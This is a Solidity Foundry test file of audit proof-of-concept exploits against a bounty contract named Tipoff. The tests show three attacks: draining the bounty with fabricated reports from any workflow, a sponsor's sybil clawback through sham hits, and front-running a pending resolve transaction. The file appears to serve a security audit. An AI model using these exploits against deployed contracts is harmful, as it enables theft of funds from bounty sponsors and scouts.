// SPDX-License-Identifier: MIT
pragma solidity 0.8.37;

import {TipoffBase} from "../../test/Base.t.sol";
import {Tipoff} from "../../src/Tipoff.sol";

/// Krait PoCs. Run: FOUNDRY_TEST=.audit/poc forge test -vv
contract KraitPoc is TipoffBase {
    /// M-1: with workflow checks unset (the deploy script's default), the contract accepts a report from ANY workflow
    /// the forwarder delivers. An attacker who tips a candidate can fabricate a hit on it and take the bounty.
    function test_M1_anyWorkflowCanFabricateHits() public {
        vm.prank(owner);
        tipoff.setResolverConfig(forwarder, bytes32(0), address(0)); // as Deploy.s.sol configures it
        uint256 id = _create();
        uint256 attackerBefore = usdc.balanceOf(scouts[0]);
        uint256 now_ = block.timestamp;

        // Attacker tips three arbitrary "candidates" of their own, then fabricates evidence for each.
        for (uint256 i = 0; i < 3; ++i) {
            bytes32 cand = _candidate(address(uint160(0xBAD0 + i)));
            uint256 t = _commit(0, id, cand);
            now_ += 1;
            vm.warp(now_);
            bytes memory foreignMeta = abi.encodePacked(keccak256("attacker-workflow"), bytes10("x"), makeAddr("attackerOwner"), bytes2(0));
            vm.prank(forwarder); // the production forwarder delivers any workflow's report to the receiver it names
            tipoff.onReport(foreignMeta, abi.encode(id, cand, uint64(now_), bytes32(0)));
            _prove(0, t, cand);
        }
        vm.warp(_params().tipDeadline + 31 days);
        for (uint256 i = 0; i < 3; ++i) tipoff.settle(id, _candidate(address(uint160(0xBAD0 + i))));

        uint256 stolen = usdc.balanceOf(scouts[0]) - attackerBefore;
        emit log_named_uint("attacker took (USDC)", stolen / 1e6);
        assertEq(tipoff.getProgram(id).available, 0, "bounty fully drained");
        assertGt(stolen, (uint256(BOUNTY) * 99) / 100);
    }

    /// M-2: the sponsor declares sham hits on candidates its own sybil tipped, exhausting the bounty; the real hire's
    /// evidence hit then records reward 0 and the honest scout is paid nothing. Cost to sponsor: the 0.5% fee.
    function test_M2_sponsorClawsBackViaShamHits() public {
        uint256 id = _create();
        bytes32 realHire = _candidate(makeAddr("realHire"));
        uint256 honest = _commit(0, id, realHire); // honest scout names the real hire
        uint256 sponsorBefore = usdc.balanceOf(sponsor);

        // Sybil (scout 5, controlled by the sponsor) tips 3 junk candidates; sponsor "backs" each.
        address sybil = scouts[5];
        uint256 now_ = block.timestamp;
        for (uint256 i = 0; i < 3; ++i) {
            bytes32 junk = _candidate(address(uint160(0x5A30 + i)));
            uint256 t = _commit(5, id, junk);
            now_ += 1;
            vm.warp(now_);
            vm.prank(sponsor);
            tipoff.resolve(id, junk);
            _prove(5, t, junk);
        }
        assertEq(tipoff.getProgram(id).available, 0, "bounty pre-allocated to sham hits");

        // The sponsor now hires the real candidate; CRE reports it faithfully.
        _report(id, realHire, uint64(now_));
        assertEq(tipoff.getHit(id, realHire).reward, 0, "real hit pays nothing");
        vm.expectRevert(Tipoff.AlreadySettled.selector);
        _prove(0, honest, realHire);

        vm.warp(_params().tipDeadline + 31 days);
        for (uint256 i = 0; i < 3; ++i) tipoff.settle(id, _candidate(address(uint160(0x5A30 + i))));
        uint256 recovered = usdc.balanceOf(sybil);
        emit log_named_uint("sponsor recovered via sybil (USDC)", recovered / 1e6);
        emit log_named_uint("fee paid (USDC)", usdc.balanceOf(feeRecipient) / 1e6);
        assertEq(usdc.balanceOf(scouts[0]), 0, "honest scout got nothing");
        assertEq(recovered + usdc.balanceOf(feeRecipient), BOUNTY);
        sponsorBefore; // sponsor and sybil are the same economic actor
    }

    /// M-3: the action's transaction (resolve, or the treasury payment) reveals the candidate while pending. A watcher
    /// who lands a tip in an earlier-timestamped block still counts and dilutes honest scouts.
    function test_M3_frontRunTheActionTx() public {
        uint256 id = _create();
        bytes32 x = _candidate(makeAddr("founderX"));
        uint256 honest = _commit(0, id, x);
        vm.warp(block.timestamp + 10);
        // Sponsor's resolve(id, x) is pending in the mempool; attacker sees x and gets included one second earlier.
        uint256 frontrun = _commit(1, id, x);
        vm.warp(block.timestamp + 1);
        vm.prank(sponsor);
        tipoff.resolve(id, x);
        _prove(0, honest, x);
        _prove(1, frontrun, x); // accepted: committedAt < actedAt
        vm.warp(tipoff.getHit(id, x).claimDeadline + 1);
        tipoff.settle(id, x);
        emit log_named_uint("honest scout (USDC)", usdc.balanceOf(scouts[0]) / 1e6);
        emit log_named_uint("front-runner (USDC)", usdc.balanceOf(scouts[1]) / 1e6);
        assertGt(usdc.balanceOf(scouts[1]), 0);
    }
}
